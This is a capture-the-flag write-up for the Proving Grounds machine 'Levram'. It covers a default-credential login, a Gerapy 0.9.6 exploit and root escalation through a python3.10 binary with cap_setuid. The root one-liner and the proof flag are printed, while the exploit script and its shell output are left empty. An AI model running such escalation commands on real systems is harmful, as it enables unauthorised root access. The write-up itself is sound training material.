## 0. Machine Info

Levram is an easy machine from Proving Grounds, and this one is pretty straight forward.

## 1. Recon
- nmap

There is nothing special or common cve with versions above or any interesting interactions. Let's start with webapp enumeration.

## 2. Initial Foothold

I tried a basic admin:admin, and I got in (...)

![levram-1](../contentImages/levram/levram-1.png)

Then, the footer revealed that they have Gerapy 0.9.6 running behind the webapp. Since Subdirectory enumeration didn't work well, I started to search CVE for Gerapy


Quick search for CVE:

```
┌──(hosan㉿kali)-[~]
└─$ searchsploit gerapy          
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path

---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

That's exactly what we need!


For this exploit, we need more than one project. But as we can see from the first image, we have no projects right now, so I simply created a project.

![levram-2](../contentImages/levram/levram-2.png)

Then I executed the script, got my shell.

```

```

## 3. PrivEsc to root

I executed linpeash.sh, but there were too many potential risks.


What I tried:

- sudo -l
- kernel exploit
- suid/sgid binary


Nothing worked. But at last, I found that python3 (as binary) has following (linux-) capability!:
```
Files with capabilities (limited to 50):
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/snap/core20/2318/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep !this one
```

What is capability then?


> Capabilities are useful when you want to restrict your own processes after performing privileged operations (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious commands or arguments which are then run as root.

For example, if there is setuid capability bit for a binary allowed, the binary is allowed to change the setuid of it's process if it is being executed, since cap_setuid=ep is enabled for python3.10!


It means, we can use import os; os.setuid(0) by executing python from command shell!

```
app@ubuntu:~/gerapy$ python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
< -c 'import os;os.setuid(0);os.system("/bin/bash")'
whoami
root
cat /root/proof.txt
96809490798d8d9d8779af42f6fb0f24
```

I got root. That's pretty much it.

## 4. Review

Easy enough, fair enough.


It covered all basic stuffs though (with privesc enumeration)
